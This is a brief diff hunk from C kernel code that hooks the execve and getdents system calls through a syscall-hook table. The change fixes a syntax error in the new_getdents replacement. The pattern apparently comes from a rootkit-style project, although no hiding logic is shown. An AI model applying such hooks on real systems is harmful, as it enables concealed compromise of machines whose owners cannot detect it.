@@ -331,7 +331,7 @@ asmlinkage int new_execve(const char *filename, char *const argv[], char *const 
   return (*orig_func)(filename, argv, envp);
 }
 
-asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {}
+asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
   int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
   t_syscall_hook *getdents_hook;
 
